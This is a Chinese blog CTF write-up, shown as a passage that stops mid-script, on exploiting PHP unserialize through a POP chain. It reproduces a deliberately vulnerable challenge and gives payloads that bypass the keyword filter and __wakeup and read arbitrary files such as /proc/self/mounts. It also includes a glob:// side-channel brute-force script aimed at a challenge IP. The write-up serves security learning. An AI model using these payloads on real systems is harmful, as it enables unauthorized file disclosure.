@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="en-uk" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='PHP 反序列化实例练习 实例1 来源：php反序列化利用——POP链构造实例 &amp;lt;?php // 题目中的第一个Class class MyDirectory { public $name; // 构造器，新的对象建立时被调用 public function'><title>PHP 反序列化实例练习</title>
+
+<link rel='canonical' href='https://ginkgo.org.cn/posts/php_unserialize_examples/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='PHP 反序列化实例练习'>
+<meta property='og:description' content='PHP 反序列化实例练习 实例1 来源：php反序列化利用——POP链构造实例 &amp;lt;?php // 题目中的第一个Class class MyDirectory { public $name; // 构造器，新的对象建立时被调用 public function'>
+<meta property='og:url' content='https://ginkgo.org.cn/posts/php_unserialize_examples/'>
+<meta property='og:site_name' content='Under The Ginkgo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='web_security' /><meta property='article:tag' content='php' /><meta property='article:tag' content='unserialize' /><meta property='article:published_time' content='2022-06-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-06-19T23:54:32&#43;01:00'/>
+<meta name="twitter:title" content="PHP 反序列化实例练习">
+<meta name="twitter:description" content="PHP 反序列化实例练习 实例1 来源：php反序列化利用——POP链构造实例 &amp;lt;?php // 题目中的第一个Class class MyDirectory { public $name; // 构造器，新的对象建立时被调用 public function">
+    <link rel="shortcut icon" href="/img/favicon.ico" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
+                            height="237" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧐</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
+            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/medic0803'
+                        target="_blank"
+                        title="A_GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:medicwrf@gmail.com'
+                        target="_blank"
+                        title="B_E-mail"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/writeups/" >
+                writeups
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/php_unserialize_examples/">PHP 反序列化实例练习</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jun 19, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    4 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="php-反序列化实例练习">PHP 反序列化实例练习</h2>
+<h3 id="实例1">实例1</h3>
+<p>来源：<a class="link" href="https://www.jianshu.com/p/16c56bebc63d"  target="_blank" rel="noopener"
+    >php反序列化利用——POP链构造实例</a> <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 题目中的第一个Class
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">MyDirectory</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 构造器，新的对象建立时被调用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 当一个对象被当作字符串使用时触发
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 统计当前目录下的文件数量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$num</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">));</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$num</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;count </span><span class="si">$num</span><span class="s2"> files&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// C限制点
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="s2">&#34;flag path is /flag_{{uuid}}&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 题目中的第二个Class 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">MyFile</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$user</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// B限制点
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 反序列化时调用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">,</span> <span class="s2">&#34;flag&#34;</span><span class="p">)</span><span class="o">!==</span><span class="k">False</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s2">&#34;/etc/hostname&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s2">&#34;/etc/passwd&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 会调用__toString
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="nv">$this</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//题目中的限制 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl"><span class="c1">// A限制点
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="s1">&#39;user&#39;</span><span class="p">)</span><span class="o">!==</span><span class="k">False</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Hacker&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>观察源码我们可以很容易的发现最终的目标，就是让 <code>MyDirectory</code> 的对象通过 __toString 来返回flag文件的路径 <!-- raw HTML omitted --></p>
+<p>源码内我们标出了三个限制点： <!-- raw HTML omitted --></p>
+<ul>
+<li>A, 对GET输入检查是否包含&rsquo;users&rsquo;字符串，我们可以通过修改序列化字符串中的s为S，这样就可以支持利用16进制编码来进行绕过， <code>s:4:&quot;user&quot;; -&gt; S:4:&quot;use\72&quot;;</code> <!-- raw HTML omitted --></li>
+<li>B, 我们在序列化的字符串中对于 <code>MyFile-&gt;name</code> 会被 <code>__wakeup</code> 给替换掉，我们可以利用修改属性来绕过 <code>__wakeup</code> 的替换（此方法适用于PHP 7.0.10），这里我们使用浅copy来对可控变量 <code>$this-&gt;user</code> 来进行过滤 <!-- raw HTML omitted --></li>
+<li>C, 无法直接获取文件名，可以配合 <code>glob://</code> 协议来测信道出 flag 的文件名字 <!-- raw HTML omitted --></li>
+</ul>
+<p>因此我们构造 payload： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MyFile</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="o">=</span><span class="s1">&#39;/etc/hosts&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$user</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MyFile</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 利用可控参数 $a-&gt;user来绕过 $this-&gt;name的过滤
+</span></span></span><span class="line"><span class="cl"><span class="c1">// &amp;$a-&gt;user表示传一个引用，而不是单纯的值，结果就是如果 $a-&gt;user 发生改变，那么 $a-&gt;name 也会跟着改变
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 这样就可以防止 $a-&gt;name 被替换，同时因为Myfile中会根据 $_GET[&#39;user&#39;] 来给 $a-&gt;user 赋值，因此可以完成变量控制
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">user</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 绕过 &#39;user&#39; 过滤
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$b</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;user&#34;</span><span class="p">,</span><span class="s2">&#34;use</span><span class="se">\\</span><span class="s2">72&#34;</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;;s:4:&#34;</span><span class="p">,</span><span class="s2">&#34;;S:4:&#34;</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 得到序列化结果:
+</span></span></span><span class="line"><span class="cl"><span class="c1">// O:6:&#34;MyFile&#34;:2:{s:4:&#34;name&#34;;s:0:&#34;&#34;;S:4:&#34;use\\72&#34;;R:2;}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 文件任意读 payload：
+</span></span></span><span class="line"><span class="cl"><span class="c1">// input=O:6:&#34;MyFile&#34;:2: {s:4:&#34;name&#34;;s:0:&#34;&#34;;S:4:&#34;us\65r&#34;;R:2;}&amp;user=/proc/self/mounts
+</span></span></span></code></pre></div><p>Payload中出现的 <code>R:2;</code> 表示的变量的类型是引用（显示的引用） <!-- raw HTML omitted --></p>
+<p>这一步的目的是通过构造POP链来调用敏感函数 <code>file_get_contents</code> 来获取任意文件的内容； <!-- raw HTML omitted --></p>
+<p><code>__construct() ( -&gt; unserialize()) -&gt; __wakeup() -&gt; __destruct() (-&gt; echo()) -&gt; __toString() (调用 __destruct() 的时候调用了echo $this, 触发了 __toString())</code> <!-- raw HTML omitted --></p>
+<p>大家可以单步调试一下，就能更好的理解这边的POP链以及这边用到的对象引用问题 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/Screen%20Recording%202022-06-19%20at%2012.32.12.gif"
+         alt="Figure 1: 单步调试POP链" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 1: <!-- raw HTML omitted -->单步调试POP链</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>那么我们现在只剩下flag的文件路径不知道了，此时就需要想办法利用 <code>MyDirectory类</code> 来 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MyDirectory</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="o">=</span><span class="s1">&#39;glob:///flag_&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MyFile</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="o">=</span><span class="s1">&#39;/etc/hostname&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$user</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MyFile</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MyDirectory</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">urlencode</span><span class="p">(</span><span class="nv">$b</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// O:6:&#34;MyFile&#34;:2:{s:4:&#34;name&#34;;O:11:&#34;MyDirectory&#34;:1:{s:4:&#34;name&#34;;s:13:&#34;glob:///flag_&#34;;}s:4:&#34;user&#34;;s:0:&#34;&#34;;}
+</span></span></span></code></pre></div><p>我们这里利用PHP伪协议， <code>glob://</code> 来匹配查找文件路径，利用测信道攻击，即如果glob匹配成功，则返回的是 <code>/etc/hostname</code> 其中避免包含&rsquo;root&rsquo;字段，如果不是，则返回 <code>/etc/passwd</code> <!-- raw HTML omitted --></p>
+<p>然后逐步拼接flag的字符串，就和我们在sql注入中的盲注是一个道理 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">import</span> <span class="nx">requests</span>
+</span></span><span class="line"><span class="cl"><span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;http://124.16.75.162:31102/&#39;</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 假设flag最多有40个字符这么长
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="nx">_</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">40</span><span class="p">)</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 利用匹配Ascii字符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">i</span> <span class="o">==</span> <span class="mi">37</span> <span class="k">or</span> <span class="nx">i</span> <span class="o">==</span> <span class="mi">42</span> <span class="k">or</span> <span class="nx">i</span> <span class="o">==</span> <span class="mi">63</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">param</span> <span class="o">=</span> <span class="nx">r</span><span class="s1">&#39;?input=O:6:&#34;MyFile&#34;:2:{s:4:&#34;name&#34;;O:11:&#34;MyDirectory&#34;:1: {s:4:&#34;name&#34;;s:&#39;</span><span class="o">+</span><span class="nx">str</span><span class="p">(</span><span class="mi">14</span><span class="o">+</span><span class="nx">_</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;:&#34;glob:///flag_&#39;</span><span class="o">+</span><span class="nx">flag</span><span class="o">+</span><span class="nx">chr</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;%2a&#34;;}S:4:&#34;us\\65r&#34;;s :0:&#34;&#34;;}&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span> <span class="o">=</span> <span class="nx">requests</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">url</span><span class="o">+</span><span class="nx">param</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 测信道攻击，根据返回的文件内容判断是否匹配上了
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="s1">&#39;root&#39;</span> <span class="nx">in</span> <span class="nx">res</span><span class="o">.</span><span class="nx">text</span><span class="o">:</span>
